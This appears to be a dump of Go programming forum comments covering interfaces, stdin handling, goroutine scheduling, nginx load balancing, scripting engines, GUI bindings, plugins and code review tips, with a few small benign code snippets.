There are web specific benchmark also https://www.techempower.com/benchmarks/
It was an interactive tutorial. Where you were the student of a monk teaching you in the way of Ruby. There was a section of text describing a part of Ruby. Then interactive examples and questions. I believe the site used tests in the background to verify your answers. 
An interface is a container for a type that implements the method signatures declared on that interface. The error interface does not have an implementation of Error() string. If you try to call this method on the interface, and it has no concrete type, the call will fail because the interface has no implementation to call. Don't mix up interfaces and their concrete types.
Okay, that was the OP, I'm danredux, the person replying to that. :)
Probably not as user friendly as Ruby monk but Go has a few [codewalks](https://golang.org/doc/codewalk/) like [this one](https://golang.org/doc/codewalk/functions/).
You could turn `SomeUtilityFuncThatNeedsRuntime` to a method of `RuntimeConfig`. That way it can easily have access to db. You can also go one step further and rename `RuntimeConfig` to `App` or something similar as it seems that it captures better what you are trying to do. Besides the struct already contains an `app_name` field (which frankly should be renamed to `appName` or potentially just `name`).
What you want to do is use the "ok" value. Here is an [example](https://play.golang.org/p/D_jWY9OoEA)!
Use it, break it, check it out. PRs/bug reports/ideas/comments/suggestions all welcome.
I did a small LuaJIT + cgo implementation for writing Lua middlewares and use them to modify requests inside a Go HTTP application. It works in a decent way however an alternative approach I've used (with other languages, not Lua) is to call custom middleware via gRPC, so the middleware runs its own gRPC server and Go just calls it, it might perform better in some situations, because the cgo overhead is big. I suggest running benchmarks based on your use case, I did this in the past [0]. [0] https://github.com/matiasinsaurralde/go-lua-benchmark
Dependency injection. Use it.
This is helpful. Not quite the same experience . 
Interesting! Was your Lua implementation found in your C code then or directly in Go? Sorry if that was supposed to be obvious, I'm still learning some of this terminology. Thanks for the tip about gRPC as well. I'll definitely check that out. How does Go handle persistence, or doesn't it? Is there a way to capture a snapshot of state in Go like Akka captures it? I'm guess no since I think the reason why Akka can capture it in the first place is because of messages. It can even replay them, which is kind of neat.
Go programs commonly compile and start in a fraction of a second. Rather than doing something kinky, I'd recommend running more than one copy behind a load balancer (like nginx) and restarting them one at a time.
Regarding nginx, you can use the restful interface on nginx to add instances to the balancer automatically on startup. If you gracefully shutdown your old Go instance, it can self unregister from the group as well. It's very slick to see working and requires very little code to accomplish.
&gt; The proxy would have to somehow rewrite the requests to the internal copies. Yes? That's exactly what the proxy would be designed to do. I feel like you're disagreeing with me that such a thing would be technically possible. I'm simply arguing that Go could and should do more of a Maven-like central repository approach than the current one.
A key aspect of Erlang's channel implementation is that the task scheduler takes into account the channel's size when scheduling tasks. Erlang uses a preemptive scheduler (go has a cooperative one), which means that the Erlang runtime is allowed to interrupt a running task and start running another at any time. To accomplish this, every operation performed by a task costs some amount of "task credit"; when a task runs out of "task credits" it is usually interrupted and another task run. Sending messages on channels costs more "task credits" if the receiving channel has many waiting messages. This acts as a natural backpressure mechanism, mitigating many other issues with using unbounded channels by making it much harder to actually have a very high number of waiting messages.
&gt;&gt;The builtin error type has a Error() string method. &gt; This one is wrong. "error" is an interface, not a type. I think that was a bit of a pointless nitpick, but if we are being pedantic your statement is incorrect. The type error Interface types are still a type, this should be fairly clear by the fact they have the word type in front of them :) I.E.: type Foo interface {} // I am a type type MyString string // also a type type MyError error // also a type &gt;&gt; interface is also one kind of type. :) &gt; That can be true if you do "type MyErr error", but the "Error() string" method is not on that type. This is wrong, I know what you meant- you are defining a method as the function with a receiver of **T** that has a signature which allows it to satisfy the **MyErr** interface. This is correct but when being pedantic it's incorrect to disqualify **MyError** as having no Error method. An interface has something called a method set. As it pertains to interfaces there is only one way for a method to be "on it's type", that is to be part of the interfaces methods set. Both **MyErr** and any **T** that satisfies the **error** interface have a **Error()** method in the closest technical meaning of your usage of the term here. &gt; "Interfaces are named collections of method signatures." *"Interfaces are named collections"* Wrong, types may be [named](https://github.com/cstockton/go-conv/blob/master/conv.go#L125) or [unnamed](https://github.com/cstockton/go-conv/blob/master/numeric.go#L86) just like all other types. *of method signatures* Wrong, interfaces may contain no method signatures at all. Basically anything in Go that gets a storage location has to have a T. Because the [T](https://github.com/cstockton/go-unslow/blob/master/unsafe.go#L61) is used by GC, it defines alignment, the underlying kind, etc. So a interface declaration must be assigned a T. For example any variable of "a" interface type such as **var b io.Reader = new(bytes.Buffer)** also have a T, that is type io.Reader. In addition it has a distinct type associated to it which is the T of bytes.Buffer. If b was interface{} the same applies, except the T is [eface](https://github.com/cstockton/go-unslow/blob/master/unsafe.go#L79) which as you see is just a _type and a pointer to another type. More or less none of this matters, you just need to know how to satisfy io.Reader to have a good time! But hey, you asked.
I don't see a distinction. Go schedules goroutines on OS threads, the OS does the rest, right?
Go does userspace context switching for goroutines. So a thread has to voluntarily stop executing a goroutine and start executing a different one in userspace, which is cooperative scheduling (although the Go runtime handles this instead of the application code). Go could run hundreds of goroutines on a single thread without deferring to the kernel.
Yes, this is what I envisioned, never thought or meant to imply that there was one thread per goroutine, but I suspect we disagree on the definition of cooperative. :-)
Yes, understood, thanks. Never meant to imply one thread per goroutine.
You could also try to do that with Otto (JavaScript Interpreter). Used it a while back to implement a little scripting "Engine" so I could define behaviors in seperate files and still use all the Syntax that JavaScript has to do logic stuff. Maybe not what you would want but still worth a Wach.
exercism.io
73% is not a bad coverage and afaik the authboss package works very well. I recommend to drop looking at raw testing metrics as a measurement of package quality, it's not possible to test 100% of all code. Instead, you should look at what is and isn't tested and how.
You can remove the newlines with [strings.TrimSpace](https://golang.org/pkg/strings/#TrimSpace), or try parsing with [fmt.Fscanf](https://golang.org/pkg/fmt/#Fscanf) and friends.
Maybe try with bufio.NewScanner(os.Stdin) 
i want to read an input and newScanner doesn't seems to work
Exactly this. It's not because the code has coverage that it is bug free. I can have 100% coverage and have the most insecure library.
I meant scanner := bufio.NewScanner(os.Stdin) for scanner.Scan() { fmt.Printf("%s", scanner.Text()) } 
I don't think you should start with oAuth, start with implementing your own version using gorilla/sessions for stateful and JWT tokens for RESTful API, you can read more about them here, https://github.com/thewhitetulip/web-dev-golang-anti-textbook/blob/master/manuscript/4.0authentication.md
I do not know about RubyMonk, but there are many FOSS books that you can read on github itself and use the Golang playground in another tab to execute the code written in them :-) shameless plug: I have written one! https://github.com/thewhitetulip/web-dev-golang-anti-textbook/
I think what you may be asking is to get input characters before a newline is entered? Stdin will be line buffered if it is attached to a terminal, you will want to use the vt100 interface for finer control of user input on Linux. You can do this multiple ways, interact with /dev/tty directly, exec stty, or just search for a library to do these things for you (what I suggest) for a more portable general approach. 
Also, the jvm is everywhere, can't really say that for Go. For Go, there is really only two truly supported platforms.
[permissions2](https://github.com/xyproto/permissions2) uses bcrypt, secure cookies and redis. It's easy to get started with, fast and hashes passwords in a way that may prevent timing attacks. Disclaimer: I'm the author, but it has &gt;200 stars on github, other contributors than me and it seems to work well.
I did something similar with otto (or motto?) a while back, +1 as it was quite reliable. I did have some [minor issues](https://github.com/robertkrimen/otto/issues/209), and it had [problems with vendoring at the time](https://github.com/robertkrimen/otto/issues/207) which was resolved a few days ago. Over-all, very happy and impressed with it!
I'd appreciate the source for this. I use nginx in production for something like 5y+ and I never came across this feature. From what I'm searching for now, it seems that it's only part of their commercial offering? [ngx_http_upstream_conf_module](https://nginx.org/en/docs/http/ngx_http_upstream_conf_module.html). I've seen bunches of hacks in LUA that add custom load balancer logic however. What are you refering to?
But why? What's wrong with stdlib [bufio.Scanner](https://golang.org/pkg/bufio/#Scanner)?
In this regard, [The Epic Fail of Enforcing Unit Tests](https://xinhuang.github.io/posts/2017-02-27-the-epic-fail-of-enforcing-unit-tests.html).
Thank you for the feedback, I will consider this soon! :)
It's just a more convenient wrapper over the bufio.Scanner.
Yes, sorry, it is only available in their commercial version. But it cost us less than having to develop similar functionality in house, so it was worth it.
There's the official go tour (on the main website). It's interactive. Also check this out: https://learnxinyminutes.com/docs/go/
Nice! Looks like it got potential! I hope it stays active for a long time. That way it can be a winner as a 3D game engine for Go. It's sad to see things like this just die out after a while.
This is great! So were you able to change the logic on the fly without restarting the Go application, or what was your process for that? Was a simply file save enough to push changes or did you have to explicitly tell Go to reload the JavaScript?
Great advice! Thanks so much. I'll take a look at gob, it sounds exactly like what I need. Akka certainly seems to have some good things going for it but I've had a really difficult time working with it.
So basically make my changes and then swap out the old instances with the new instances using nginx? Not sure I understood you correctly. Even then, my use case for this technology is probably not at all typical. Could I still use nginx to load balance massive game worlds written in Go? That's ultimately my goal. Improbable.io is doing something similar with Akka but it's a pain to use. If I could use a more common scripting language like JavaScript or Lua for the behavior logic that would help development time.
Very nice. I love how portable it is! There are some stack overflow pages I've visited more times than I'd like to admit. This might well help. Thanks! 
My biggest gripe with Akka is that the clustering doesn't understand regions. We had a few on premise nodes (used for local printing) that decided they wanted to be cluster owners. When that occurred, all 100+ nodes in AWS decided to re-home to the on-prem server and buried the local pipe. Then the whole cluster decided that part of it was unreachable and failed back to cloud nodes, only to have the cycle repeat again. I couldn't tell Akka to stop using the local nodes as leaders. Edit: to clarify, placing etcd nodes in a fixed location and letting participating nodes check into and out of etcd has worked far better than Akka since I can maintain control of cluster leader positioning. Using gRPC and Protobuf was cool, but simple restful services were easier to produce and consume at this point.
Thanks! If you have any features you want, please create an Issue!
I had a Web Application where you could create new scripts or edit them and change which one should be executed and so on. If an edit occurred I simply reset the Otto VM and executed the new version. That was the basic process more or less.
Nice! I really like the way the interface looks, very clean and intuitive. I'll have to try this out at work, there are too many commands to keep track of.
I wonder how many others do something like I do, but I have a pretty big .bashrc with my frequent command lines. It's nice to make them parameterized and composable. My trick is I prefix everything with _ (underscore) so that I can just type underscore and tab complete all my functions. 
So under the hood you use bufio.Scanner anyways. I'm quite confused
Use a short lived one and revoke the refresh token
Thank you for your feedback!!
Currently, you can't parameterize the snippets. It is possible to select snippets and edit manually. https://github.com/knqyf263/pet#select-snippts-at-the-current-line-like-c-r If many people need it, I will implement it.
There is a standard way to do this. If you have a web application, you break up your app into 3 tiers: 1) The Load Balancer tier, 2) the application logic tier, 3) the database back-end. Using this structure lets you take out and upgrade the boxes in your application logic tier without breaking anything, because the application stores no state. Even aren't using a database now, you could easily add one by using Redis -- it's not so much a 'database' as a 'data structures server'. If you want to do minimal work, you can just store/reload protobuf encoded structs that represent your state. (If you have raw TCP connections instead of HTTP, you can use messaging to de-couple the long-lived TCP connections from your code, as someone else mentioned.) **The bottom line is: You can hide service restarts in any language.** In fact, if you don't architect correctly now (by breaking up stateful+stateless), you will cause a lot more problems down the road. Here is what a 3-tier architecture does for you: - Instead of trying to scale your mudball, you can use well-known playbooks for scaling databases + scaling LBs + scaling stateless apps. (The last one is trivial-- just run more boxes!). - Instead of trying to figure out how to gracefully deal with node failure, you can use the existing DB clustering / automatic fail-over. No need to try an add that to your app. 
What makes you want to use Go 1.6.2 instead of the latest (read: improved and bug-fixed) version? Does the Go 1 Compatibility Promise not work out for you? 
[Sample 3](https://play.golang.org/p/zwOcXnSwmK) with a straightforward code. *Also, please do not use facilitated examples in blog posts, it makes discussion difficult.*
sort.Search does a lot more than "basically nothing", namely implement binary search correctly. It's not a *lot*, but it definitely isn't "basically nothing".
No dependencies outside the stdlib, thats good! First I recommend to use some static checkers like [go fmt][1], [go vet][2], [go lint][3] and [errcheck][4]. I ran these tools on the code and they showed me a few errors. I'll highlight some complaints but I recommend to run these tools yourself. * A lot of exported comments don't have comments. * Every line after [parser.go:262][5] is unreachable. * A lot of errors values are ignored. For example at [writer.go:42][6]. Some other remarks: * [parse.go:103-107][7] can written with fewer lines: ``` go neg := false // or var neg bool because nill value of a bool is false. var neg bool = false if err := r.requireNBytes(1); err != nil { return 0, err } ``` [1]: https://golang.org/cmd/gofmt/ [2]: https://golang.org/cmd/vet/ [3]: https://github.com/golang/lint [4]: https://github.com/kisielk/errcheck [5]: https://github.com/phuongdo/go-redisproto/blob/master/parser.go#L262 [6]: https://github.com/phuongdo/go-redisproto/blob/master/writer.go#L42 [7]: https://github.com/phuongdo/go-redisproto/blob/master/parser.go#L103-L107
Simple, straightforward code. Easy to read from top to bottom. No hidden loops and complexities.
Interesting. How does it compare to mc, the https://minio.io/ client?
From reading the docs, it seems that mc works with minio or S3. Our goal is to support a common set of operations for S3, Google Cloud Storage &amp; Azure. Minio should also work. In fact osm should work with OpenStack Swift. But I have not tested it.
The `sort` package is painful to use and, I think, a bad example to emulate. Its design is a great argument in favor of generics.
Hey no problem. I did run the capability setting which had no effect it seems. I saw the github with the card layout yesterday, it looks similar but the disk tool in Ubuntu was showing the partitions slightly larger, it could just be 1024/1000 issue. The card is a fresh out of the box 64GB Sandisk U1 microSD. I'm running Ubuntu 16.04 x64 with Go 1.8. I'll check again when I get home, I'm sure I must be missing something obvious. If I still have no look I'll loop mount the partitions and try figure why it doesn't boot.
I salute you for investigating the nature of your problem, then posting about your investigation, rather than simply complaining and suggesting with one degree of subtleness or another that Go or its programmers suck.
I built this for a project that isn't finished yet. In it, I need to analyse the source and flag places where an error is returned, but only if the error has been compared to nil first. ... so, this should not be flagged: err := foo() return err ... but this should be flagged: err := foo() if err != nil { return err } Of course brenda extends this to allow more complex conditions.
Gotta love the PHP in the header image.
Alas, royalty-free stock photos have a distinct lack of golang (or LUA) code :)
https://gobyexample.com Every example has a link to the Go Playground (top right corner)
The problem I had with launching a chromeless browser was that if Chrome was already open, the flags were ignored and the link was simply opened in a new tab of the current browser. I don't think you'll get a pure go browsing solution better than that. Electron is heavy, but if you can't find something I missed with launching new browsers, you'll want to look at that or another form of Chromium Embedded Framework (CEF).
Take a look at Bitly's oauth2 proxy https://github.com/bitly/oauth2_proxy It's not exactly what you are looking for but its great for handling the basic oauth part outside of your code, then you should only need to handle the session management.
To get the "app feel" do not use template/html. Instead write an API in Go then use your favorite front-end framework in pure HTML/JS/CSS to create a single page, "progressive" web app, full with a service worker, manifest etc. My personal recommendation is [polymer](https://www.polymer-project.org/) and #UseThePlatform but any good framework will do.
Yes ! Finally I can store all my sticky note stuff in a organized manner !
Nice documentation. The examples were very helpful.
I don't think this is the case though. First of all timeout happens after 60 seconds, so I believe this is the "// Time allowed to read the next pong message from the peer." or a "pongWait" variable that is used for setting ReadDeadline and PongHandler. Anyway - I've tried doing it this way before (just in case): srv := &amp;http.Server{ Handler: r, Addr: "127.0.0.1:8000", WriteTimeout: 15 * time.Second, ReadTimeout: 15 * time.Second, } log.Fatal(srv.ListenAndServe()) Same outcome.
https://github.com/murlokswarm/app
&gt; If peco is not installed, please install first. Is peco needed if installing via homebrew? I'm rather new to using things written in go.
My guess would be that in GO you create a HMAC while on the JS side you create a simple SHA256. Try sha256.Sum() or just sha256.New() instead of hmac.New(sha256.New, []byte("")).
 package main import "fmt" import "crypto/sha256" import "encoding/hex" func main() { s := "hello world" h := sha256.New() h.Write([]byte(s)) s = hex.EncodeToString(h.Sum(nil)) fmt.Printf("%s\n", s) // b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9 } 
Okay I figured it out. All ports except for 15000 are closed. Mark as SOLVED. :)
Awesome, thank you!
generics are a form of function composition I think than he is confusing generics with high order functions It's not a criticize for the go community but I've found several people than talk about how complex/unnecessary are the generics and they even don't know what are generics and what are they useful for... 
Go is a mix a high level libraries with low level concepts. I learned C and Python prior to learning Go and found that it was way easier to understand pointers, and use slices than if I had jumped in to Go first. While I do think it is possible to learn Go as a first language, I wouldn't suggest it to anyone. It doesn't seem feasible to teach someone to build a car before learning about the different kinds of circuits.
The obsession with binary size seems silly to me. And it's the binary size of the compiler, not produced executables? Why does that dominate this discussion?
Yes, I've considered Qt although there are some library and cross-compilation convenience reasons I want to stick with Go. Actually I'm OK as-is with running it in a browser tab, it's just that I was looking to at least get it to launch and run in its own chromeless window. Sometimes I would be, but in this case I'm not hell bent on sticking to native user interface elements.
This has been answered by me and @ThomasJWaldmann (borg author) here: https://www.reddit.com/r/golang/comments/5a5jbz/ann_restic_030_secure_fast_free_deduplicated/d9e7r3q/
There are some [Qt bindings](https://github.com/therecipe/qt), albeit hard to use. With that said, one of my side projects has a Go application exposed via a websockets API to a QML frontend. Logically it requires some boilerplate, but it works.
OK, yeah, seems like I'll end up with just keeping to open a tab by using a cross-platform "open" call where I basically just do `open http://localhost:8080/` when Go has started the local web server. That open command then does whatever necessary by using its association with URL's. On Windows 10, by default it'll add an Edge tab. On Debian, it adds a Firefox tab, and so on. It's not _terrible_ and it's a way to not depend on various work-in-progress UI frameworks for Go or big embedded web browsers. Edit: I'm doing like this right now package main import ( "fmt" "net/http" "os/exec" "runtime" ) func handler(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, "Hi there, I love %s!", r.URL.Path[1:]) } func main() { go open("http://localhost:8080/") http.HandleFunc("/", handler) panic(http.ListenAndServe(":8080", nil)) } func open(url string) error { var cmd string var args []string switch runtime.GOOS { case "windows": cmd = "cmd" args = []string{"/c", "start"} case "darwin": cmd = "open" default: // "linux", "freebsd", "openbsd", "netbsd" cmd = "xdg-open" } args = append(args, url) return exec.Command(cmd, args...).Start() } 
Yeah this is the concept I'm looking for, thanks! :)
If they were "obsessed" with it, we'd have fewer features since binary size has been going up in the past few releases. They are _considering it as one of many factors_. The inability to generate small executables squeezes Go out of some spaces it could otherwise play in. Neither I nor from what I can see the Go team find this to be anything catastrophic, but it is something to be considered moving forward. For the same functionality, smaller is better than larger. Not all Go code is running on desktop machines that have more than twice the RAM they know how to use. You probably won't be surprised that there are still some embedded platforms out there where having to pay ~2-3MB off the top just for a runtime is a bit of a problem, not to mention how easy it is to tack on more MB by using net/http or encoding/json. You might be surprised at just how picky cloud server writers can be about their bytes too, though. Executable sizes on their own are rarely an intrinsic problem the way that an executable can be simply too large to run on a given embedded platform, but the implied issues with how their stuff fits into cache can be a big deal for them.
Thanks to paying consideration to binary size, it's actually been on a downward trend the last couple of releases: https://blog.golang.org/go1.7-binary-size
My apologies, and thanks for the correction.
Nothing to apologize about. :)
You can ´go run main.go´ just as easily as ´python3 main.py´.
No. If you use homebrew, peco will be automatically installed.
Man your post got so much more love then my comments here https://www.reddit.com/r/golang/comments/5yl984/is_there_a_webassembly_compiler_for_go_in_the/ It is a different topic but I'm jealous you got that going. :P
Nice. :)
I'm curious, what's an example case where template rendering is the bottleneck?
I strongly feel that Go should be the third language (possibly fourth) after C, C++/Java, Python. This is because Go is significantly different from other languages _with_ a reason! Once you/we understand the limitations or issues in other languages, it is a treat to write code in Go. Also, if you learn C first, then you can easily pick up any other language of the C family (practically all langs are C derivatives). But if you learn Go first then there is no such history, considering Go's syntax for functions is totally different from the ordinary syntax.
&gt; I immediately thought about using two goroutines and channels for send AND receive operations per client/peer but that seemed like an overkill. Why do you think so? If you want to model asynchronous behavior in Go, goroutines and channels seem the most natural way. Just recently I implemented a [simple dataflow net](https://appliedgo.net/flow2go) this way, and the code remained really small and clear.
That will work until someone ends the line with Ctrl-D. Once you handle that you're back to checking for '\n'.
Thanks for your investigation! I just pushed https://github.com/gokrazy/tools/commit/37c5d4d4980774cc8402d883270333e8c2e7f150, could you let me know if that works for you? Now that you have things working, is there anything else we could fix that would have made your experience smoother?
Good point, I would use `strings.TrimSuffix` then.
The use case is when your server(s) load reaches its limit and you consider renting and additional server. One could save money and maintenance load by liliting the number of servers needed to run the service. 
For me template performance was never a problem. You rarely call thousands of templates in a loop. The biggest problem for me was type safety for variables in templates. Templates and template parameters can become complicated and I want things to fail on compile time, not in runtime. BTW, This is how I solved that problem: https://github.com/tkrajina/ftmpl
Thanks, I'll try that when I'm home. As for smoother, It'd be great to fix the setcap issue. Setcap didn't work for me, I always got permission denied on the write, but, either way, setting such broad capabilities for a binary is unsafe anyway. I read through the source for the packer before granting it. I think generating the necessary image etc as a normal user; then a simple "write" that can be done as sudo would be ideal. Obviously running the whole thing as sudo is not straightforward as PATH and environment will differ. I'll give it a test with some of my own projects once I get a chance as I only tried your hello binary so far, which worked, as did the web UI.
Although Gitea is written in Go, this subreddit isn't the right place to ask for Gitea support. Try https://gitter.im/go-gitea/gitea 
A really great and thorough writeup, thanks! I'm so happy to see the idea of FBP in Go (especially without frameworks, for full native Go channel performance) is catching up. I've been kind of surprised to not see more interest in these ideas before. Just as a side-note, I was delighted to see, from 30:55 and a few minutes onwards, in this video: https://youtu.be/2HOO5gIgyMg?t=1855 that Shopify also used a similar approach to packaging go-routines in structs, in their Sarama library (a Go library for Kafka), something they called "structured go-routines", as opposed to "anonymous", and "named" ones, and which has some similarities to the FBP patterns discussed in this post. I thought their explanation of "structured go-routines", might be helpful for people who are not familiar with, or even put away by, the flow-based programming term.
Good video man, hoping you'll make a psql version as well ;)
Bought a copy! Looking forward to go through it all.
From `man chromium`: &gt;--app=URL Runs URL in "app mode": with no browser toolbars. And that's about it.
Why use a plugin here? I don't see how this is a practical use of the plugin system.
Currently I've deployed two instances of this software. One as the user golang_news and one as the user julia_news on Twitter. Soon I'll be adding more. Both bots use different sources and different ways of processing these sources. But much of their functionality is the same. This seemed a good use case. Maybe there are more elegant ways of solving this but I also admit I wanted to explore the plugin system. 
I think they need to be in the (a) main package. See https://tip.golang.org/pkg/plugin/
Right, though do you have reason to believe template rendering is the cause for this limit being reached?
The slightly tautologous answer is: they're not part of the package's interface. What I mean by this is that when the package was designed, those functions were deemed implementation details and hence may make assumptions about parameter invariants and the like, since all possible callers are known statically.
Compiler optimisations (no extra steps) are different from code generators (requires go generate on changes), the extra build step and potential for code desynchronisation comes at a cost. Nevertheless, I agree, it's a nice tool and a good contribution. Honestly just curious about the target use case and the method used to diagnose the issue.
Agreed. Seems like an interface would do the same thing here.
Tautologous, nice word! Nevertheless I suppose it's nice to know you can totally bend any abstraction to your will with enough linker wizardry. Not that I would ever do that... 😅
Ran it out of curiosity, didn't work for me. Got: ``` Your Profile: Name: ***** | Your Friend| Last Time Online| | | | ``` I gave Tinder permission, but I have no Tinder account, so I presume that is why?
This is just a small gateway/reverse proxy I made for a project where a full-blown API gateway would have been an overkill. I plan to add instrumentation to it soon (being able to flexibly instrument requests is the only reason I'm not using nginx instead). Hope someone finds it useful. 
Yeah, as /u/wiiittttt said, sounds like that approach can be solved with an interface statically. The main use cases for plugins that I know of (so the list is not in any way exhaustive), are 1) to allow extensions to prepackaged software and 2) to allow dependency versions to bump independent of the dependent software version. 1) HashiCorp tools allow plugins based on a shared interface. The tools come packaged as a binary, so they have to do some kind of dynamic loading to search and load extensions at runtime. Using a plugin would work here, but since the tools predate Go 1.8 plugins, they use gRPC if I recall correctly. (Mitchell Hashimoto gave a talk on this, but I can't find it on mobile.) 2) If you have a particular piece of software versioned at v1.5.1, for example, and that software has a selection of dependencies, if you want to bump the version of one of those dependencies, then you have to bump the version of your dependent system to V1.5.2. If those deps change rapidly, you may not want to rerelease your dependent software that frequently, so instead you load those dependencies as plugins and package them separately from the dependent package. This is probably a really really bad thing to do because you could introduce a breaking change in a dependency, which would result in two copies of the dependent software having the same version and only one of them breaks. It's like creating a haystack to hide your needle in. I guess abstracting over the HashiTools use case a little, you can use plugins when you have a variable number of middleware technologies at run time, which you want to pick up and load sequentially. I think would make sense for static analysis tools, when I think about it. Just my thoughts :)
I personally prefer to do rendering on client side. I never experienced any performance issues with this approach. In case of any performance issues of course you can do prefetch. My personal choice: React + REST API in Go.
Author here. Polymerase was written to be as small and as simple as possible while still achieving its goal. Both of the tools you mentioned are great but appear to cater to a large set of use cases. I'd say use polymerase if it fits your needs. 
Sorry if title was misleading - will try to be more direct in future on that... It's about their technical use case for NATS and Kubernetes, rather than Clarifai's own platform features and product.
Node has jade/express views or you could do server side rendering with React (e.g isomorphic javascript). Or you could do nodejs server/apis and then angular/auerlia/vue/react+redux/ember/backbone/polymer client Go has templates similar to jade/express views. I don't know of anything similar to server side rendering in Go (there are some packages out there but not sure id recommend it). Id personally recommend go server + api with a frontend client. any of the above frontends are good..each has its ups and downs
I also experimented with constructing the StringHeader directly, but I felt it might be preferable to allocate a normal string and then take a StringHeader from it because the unsafe package offers the following warning: "In general, reflect.SliceHeader and reflect.StringHeader should be used only as *reflect.SliceHeader and *reflect.StringHeader pointing at actual slices or strings, never as plain structs. A program should not declare or allocate variables of these struct types.".
This is way cool! I've been working on a sort of similar project gathering telemetry from model rockets. Mine is all passive though, this autopiloted blimp is a much more interesting project! I took a cursory glance and couldn't find any, but is the code for this available anywhere?
My kingdom for OSX support :(
Hey! I came across this yesterday too :) It seems like a very nice project with a lot of potential.
With go we can do server or client rendering. The choice depends on the type of app and round trip time (rtt). The rtt is ~ the ping time delay value that is so important in games. If the RTT is high, you should favor rendering in the client. The user will have a more responsive application. Also, the more processing can be pushed on the client side, the less servers you'll need to run your service. Usually, you pay for the servers. If you want to support really weak clients like old smartphones, than you should keep some work on the server obviously. So my rule of thumb is to favor client rendering and fallback to server rendering only when required. This is why I have big hopes on go support of web assembly. When implementing a server I also consider the app size and transmission time. Those JS frameworks are not free. So while I favor client rendering I also keep some parts on the server. 
You can set your own gRPC logger using: google.golang.org/grpc/grpclog.SetLogger() But be aware that it must be called from init() functions only. You can check out etcd sources to see how CoreOS guys have overcome this limitation: https://github.com/coreos/etcd/blob/master/clientv3/logger.go
I didn't want to say that my solution is better than your. In fact, at the moment I'm working on a project which already has a ton of html/template files. Rewriting them all would be a pain, so I'll probably try your library. 
&lt;trolling&gt; probably just a typo in the title: s/of using/of overengineering using/ &lt;/trolling&gt;
I'm not sure what is recommended, but I am working on a medium-sized SPA (using React/Typescript/etc) with a go backend. In our case, the only connection between the frontend and backend is through a REST-like api, they live in entirely separate repos. This has some pros/cons. Any update to the api has to be consistent across both repos. Our api has settled down for the most part, so this doesn't come up for us. A pro is that you can work on either end independently, and even mock the other side very easily. For example, I use curl or [this extension](https://github.com/Huachao/vscode-restclient) to test the backend, and I wrote a simple js file which mocks the backend (returning some random-ish data). I think separating the concerns this way can be helpful in environments with more than one developer. In your situations, because you have templates, this may not be as simple. But unless you're going to try and use [gopherjs](https://github.com/gopherjs/gopherjs) to write the frontend in Go, you may consider making it a whole new directory and following best practices for Vue in that directory.
I'd probably go with Node, it has many tools and frameworks for web automation. To my knowledge, Go is generally faster and easier to scale, but the difference is not that much. You can achieve "multithreading" in Node by running multiple processes, see the cluster module and process managers like pm2.
I usually put the SPA in `/app`, but it doesn't really matter; they could be in seperate repos as well if you prefer that. You generally don't want server side templates in a SPA because they hurt performance. Fetch data via a REST API and render everything on the client.
I like this https://github.com/golang-ui/nuklear/ and hope it can become big with nice support from the community. :)
SPA means **Single Page Application**, that is a page that loads once, then reloads the data via ajax calls. For the lazy
There are Go libraries for handling your usecase. Performance-wise and not-being-goddamned-Javascript-wise, Go does better than Node.
I suggest splitting the frontend and backend. Keep them in seperate repos. Build your backend in Go and expose an API. The frontend can be built in anything you like (Vue, React, Angular, etc), and use any structure you want to use. Now your frontend isn't tangled up with your backend. You could deploy a backend on GAE, and a frontend via Cloudfront with free SSL.
Both platforms can easily handle hundreds of users. Node is a bit quicker of a platform to develop on, but it costs you more in the long run in maintenance. If your team size is &gt; 3 I think Go clearly wins. fwiw, I've found working with SQL DBs in Go unpleasant compared to scripting languages. Disclaimer: I lead a team of Node developers, but would like to transition to Go.
Have you tried: https://github.com/sciter-sdk/go-sciter Golang bindings of Sciter: the Embeddable HTML/CSS/script engine for modern UI development http://sciter.com As for Qt, the bindings are awesome (https://github.com/therecipe/qt). People who think the bindings are difficult just don't like Qt itself, which is fine bc Qt is a pain - but a lot easier to code Qt in Go than in C++. Other libs worth mentioning: Recently mentioned on reddit - (https://github.com/g3n/engine) the Go 3D Game Engine has UI. And raylib (https://github.com/gen2brain/raylib-go) uses IMGUI (excellent sound support). There are also nano gui and nanovg bindings: https://github.com/shibukawa/nanogui-go https://github.com/shibukawa/nanovgo nuklear: https://github.com/golang-ui/nuklear 
Nice. BTW, this seems a perfect scenario for a code generator, to create the structs from TOML or YAML config text.
Why is it awesome?
Does this work with spf13 Cobra?
This is really just illustrating how to load a config which has multiple plugins which fit the same interface, a common problem with serialization in general with golang. It's awesome because of how simple the toml library makes it to load a config with multiple instances of the same interface. YAML and JSON packages are much more difficult to do because they don't export anything similar to the Parse function in the toml package.
This is a good way to do configuration. Though personally, I'd only call it awesome if it could be done with just the standard library.
Thanks for explaining, it is clearer now. Maybe I had exaggerated expectations based on the claim in the title :-)
&gt; The biggest problem was that package C hadn’t used semantic versioning, so I had to try random library C commits and try to get this thing working… So the real problem is not about dependencies as such, but rather about libraries that do not use proper version management. But I get your point - the stdlib is often underutilized in favor of 3rd-party libs that do not provide much advantage (besides convenience perhaps) but have the potential to cause unforseen problems.
Actually, you should have two goroutines for read and write, and maybe a third goroutine that handles the client logic. Read sends data to logic handler, logic handler do stuff depending on the data from client, then sends some data back to the write goroutine, which passes it down to client. The logic handler can also listen to other server events that might be important for the client to know.
Yep my main point is that standard library is underutilized :) And I think devs coming from other languages have this habit of using external libraries for everything. For example in Java world: logging - log4j, web-server - tomcat, ... And golang has such a rich standard library, that you could do a lot without having any dependency problems. 
nice article. may I point to my flow-based toolkit that is used in high energy physics to expose concurrency? here: - https://go-hep.org/x/hep/fwk there are a couple eamples here: - https://github.com/go-hep/hep/blob/master/fwk/examples/fwk-ex-tuto-1/main.go - https://github.com/go-hep/hep/blob/master/fwk/examples/fwk-ex-tuto-2/main.go - https://github.com/go-hep/hep/blob/master/fwk/examples/fwk-ex-tuto-3/main.go the first example schedules 2 tasks: - t1, creates int64 integers with values 10 and 20, and publishes under the slots `"t1-ints1"` and `"t2-ints2"` - t2 reads an int64 from `"t1-ints1"`, and publishes the result of multiplying it by 10 under `"t1-ints1-massaged"` the 2 other examples add reading from and writing to input and output files. what I like about my framework is that the coupling all the tasks is limited. you just declare ports (types and names) and then the `fwk` handles the scheduling of the tasks. ie: you don't have to painfully connect all the nodes by hand. 
